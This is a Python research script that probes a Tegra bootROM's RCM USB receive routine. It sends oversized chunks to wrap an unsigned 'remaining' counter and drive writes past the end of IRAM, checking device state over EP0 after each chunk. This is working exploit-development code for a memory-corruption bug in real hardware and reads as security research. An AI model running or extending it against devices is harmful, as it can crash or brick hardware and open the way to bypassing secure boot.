"""Probe the accounting desync to test remaining counter wrap.

Theory: The bootROM's RCM receive function uses the USB transfer size (not the
DMA'd amount) for accounting. With the DMA capped at 0x1000 by IPATCH, sending
oversized USB chunks causes 'remaining' to decrement faster than actual data
arrives. This can wrap the unsigned remaining counter, turning the receive loop
into an unbounded write.

This script carefully sends oversized chunks while monitoring IRAM via EP0 to:
1. Confirm the accounting desync on this unit
2. Detect when 'remaining' wraps unsigned
3. See if the destination pointer goes past 0x40040000 (IRAM end)
4. Determine if writes past IRAM cause data abort (EP0 death) or are absorbed

SAFETY: Sends ONE oversized chunk at a time and checks EP0 after each.
If EP0 dies, the device hit a data abort (infinite loop in bootROM).

Usage:
    sudo python -m tegra_fuzz.remaining_wrap_probe [chunk_size_hex]

    chunk_size_hex: oversized chunk size (default 2000 = 8192)
"""
import struct, sys, time, json
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
import usb.core, usb.util

VID, PID = 0x0955, 0x7321
MSG_LEN = 0x30298
HEADER_SIZE = 0x2A8


def ep0_read(dev, timeout=500):
    try:
        return bytes(dev.ctrl_transfer(0x82, 0x00, 0, 0x81, 255, timeout))
    except Exception:
        return None


def parse_key_fields(data):
    if not data or len(data) < 88:
        return None
    fields = {}
    for off in (20, 36, 60, 64, 84):
        fields[off] = struct.unpack_from('<I', data, off)[0]
    return {
        'buf_20': fields[20],
        'ptr_36': fields[36],
        'remaining': fields[60],
        'total_recv': fields[64],
        'ptr_84': fields[84],
    }


def main():
    oversized = 0x2000
    if len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
        try:
            oversized = int(sys.argv[1], 16)
        except ValueError:
            pass

    print(f"=== Remaining Wrap Probe ===")
    print(f"Oversized chunk size: 0x{oversized:X} ({oversized} bytes)")
    print(f"DMA cap: 0x1000 (4096 bytes)")
    print(f"Accounting overshoot per chunk: 0x{oversized - 0x1000:X} ({oversized - 0x1000} bytes)")
    print()

    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if not dev:
        print("ERROR: No device found"); return 1
    print(f"Device: bus {dev.bus} addr {dev.address}")

    # Pre-claim EP0 read (REQUIRED)
    baseline = ep0_read(dev)
    if not baseline:
        print("ERROR: EP0 baseline read failed"); return 1
    print(f"EP0 baseline OK ({len(baseline)} bytes)")

    # Claim interface
    try:
        if dev.is_kernel_driver_active(0):
            dev.detach_kernel_driver(0)
    except (NotImplementedError, usb.core.USBError):
        pass
    try:
        dev.set_configuration()
        usb.util.claim_interface(dev, 0)
    except usb.core.USBError:
        pass

    # Read device ID
    try:
        did = bytes(dev.read(0x81, 16, timeout=2000))
        print(f"Device ID: {did.hex()}")
    except Exception as e:
        print(f"Device ID failed: {e}"); return 1

    # Post-claim state
    post = ep0_read(dev)
    if post:
        state = parse_key_fields(post)
        if state:
            print(f"Post-claim: remaining=0x{state['remaining']:X} ptr=0x{state['ptr_36']:08X}")

    # Phase 1: Send chunk 0 (header) normally at 0x1000
    print(f"\n--- Phase 1: Normal header chunk (0x1000 bytes) ---")
    header_chunk = bytearray(0x1000)
    struct.pack_into('<I', header_chunk, 0, MSG_LEN)
    try:
        w = dev.write(0x01, header_chunk, timeout=2000)
        print(f"Chunk 0: wrote {w} bytes (normal)")
    except usb.core.USBError as e:
        print(f"Chunk 0 FAILED: {e}"); return 1

    state = parse_key_fields(ep0_read(dev))
    if state:
        print(f"  remaining=0x{state['remaining']:X}  ptr=0x{state['ptr_36']:08X}  total=0x{state['total_recv']:X}")
        initial_remaining = state['remaining']
        initial_ptr = state['ptr_36']
    else:
        print("  EP0 read failed after chunk 0"); return 1

    # Phase 2: Send oversized chunks, one at a time
    # Calculate how many oversized chunks until remaining wraps
    extra_per_chunk = oversized - 0x1000
    if extra_per_chunk <= 0:
        print("ERROR: chunk size must be > 0x1000"); return 1

    normal_chunks_equiv = initial_remaining // 0x1000
    wrap_chunks = (initial_remaining // oversized) + 2  # a few past the wrap point
    print(f"\n--- Phase 2: Oversized chunks (0x{oversized:X} bytes each) ---")
    print(f"Initial remaining: 0x{initial_remaining:X}")
    print(f"Chunks to wrap: ~{initial_remaining // oversized}")
    print(f"Will send up to {wrap_chunks} oversized chunks")
    print(f"Monitoring EP0 after each chunk...\n")

    results = []
    prev_remaining = initial_remaining
    prev_ptr = initial_ptr

    for i in range(1, wrap_chunks + 1):
        # Build oversized chunk with marker pattern
        chunk = bytearray(oversized)
        marker = struct.pack('<I', 0xDEAD0000 | i)
        chunk[0:4] = marker
        chunk[0x100:0x104] = marker
        chunk[0xFFC:0x1000] = marker

        try:
            w = dev.write(0x01, chunk, timeout=5000)
        except usb.core.USBTimeoutError:
            print(f"  [{i:3d}] WRITE TIMEOUT — device may be processing")
            results.append({'chunk': i, 'error': 'timeout'})
            break
        except usb.core.USBError as e:
            print(f"  [{i:3d}] WRITE ERROR: {e}")
            results.append({'chunk': i, 'error': str(e)})
            break

        # Check EP0 — if this fails, we hit a data abort
        time.sleep(0.001)
        state = parse_key_fields(ep0_read(dev))
        if not state:
            print(f"  [{i:3d}] *** EP0 DEAD — probable data abort! ***")
            print(f"        Last remaining: 0x{prev_remaining:X}")
            print(f"        Last ptr: 0x{prev_ptr:08X}")
            results.append({'chunk': i, 'ep0_dead': True,
                           'prev_remaining': prev_remaining, 'prev_ptr': prev_ptr})
            break

        rem = state['remaining']
        ptr = state['ptr_36']
        total = state['total_recv']
        rem_delta = (prev_remaining - rem) & 0xFFFFFFFF
        ptr_delta = (ptr - prev_ptr) & 0xFFFFFFFF

        # Detect wrap
        wrapped = rem > prev_remaining and i > 1
        past_iram = ptr >= 0x40040000

        flag = ""
        if wrapped:
            flag += " *** REMAINING WRAPPED! ***"
        if past_iram:
            flag += " *** PAST IRAM END! ***"

        line = (f"  [{i:3d}] rem=0x{rem:08X} ptr=0x{ptr:08X} "
                f"total=0x{total:X} Δrem=0x{rem_delta:X} Δptr=0x{ptr_delta:X}{flag}")
        print(line, flush=True)

        results.append({
            'chunk': i, 'remaining': rem, 'ptr': ptr, 'total': total,
            'rem_delta': rem_delta, 'ptr_delta': ptr_delta,
            'wrapped': wrapped, 'past_iram': past_iram,
        })

        prev_remaining = rem
        prev_ptr = ptr

        # If remaining wrapped and destination is past IRAM, we've proven the theory
        if wrapped and past_iram:
            print(f"\n  CONFIRMED: remaining wrapped AND destination past IRAM!")
            print(f"  Sending one more chunk to test if write past IRAM survives...")

            # Send one more
            chunk2 = bytearray(oversized)
            chunk2[0:4] = struct.pack('<I', 0xCAFE0001)
            try:
                w2 = dev.write(0x01, chunk2, timeout=5000)
            except Exception as e:
                print(f"  Post-wrap write failed: {e}")
                break

            time.sleep(0.002)
            state2 = parse_key_fields(ep0_read(dev))
            if state2:
                print(f"  POST-WRAP: rem=0x{state2['remaining']:08X} ptr=0x{state2['ptr_36']:08X}")
                print(f"  *** DEVICE SURVIVED WRITE PAST IRAM! ***")
            else:
                print(f"  EP0 DEAD after post-wrap write — data abort occurred")
            break

        # If we're getting close to wrap, slow down
        if rem < oversized * 3:
            print(f"        (approaching wrap, {rem} bytes remaining)")

    # Try to read response
    print(f"\n--- Phase 3: Check for response ---")
    try:
        r = bytes(dev.read(0x81, 4096, timeout=3000))
        val = struct.unpack_from('<I', r, 0)[0] if len(r) >= 4 else -1
        print(f"Response: {len(r)} bytes, status=0x{val:08X}")
    except usb.core.USBTimeoutError:
        print("No response (timeout) — device may be in receive loop or hung")
    except usb.core.USBError as e:
        print(f"Response error: {e}")

    # Final EP0 check
    final = parse_key_fields(ep0_read(dev))
    if final:
        print(f"Final EP0: remaining=0x{final['remaining']:08X} ptr=0x{final['ptr_36']:08X}")
    else:
        print("Final EP0: DEAD")

    # Save results
    out = {
        'chunk_size': oversized,
        'msg_len': MSG_LEN,
        'initial_remaining': initial_remaining,
        'initial_ptr': initial_ptr,
        'results': results,
    }
    outpath = str(_PROJECT_ROOT / "findings" / f"remaining_wrap_0x{oversized:X}.json")
    with open(outpath, 'w') as f:
        json.dump(out, f, indent=2, default=str)
    print(f"\nResults saved to {outpath}")
    return 0


if __name__ == '__main__':
    sys.exit(main() or 0)
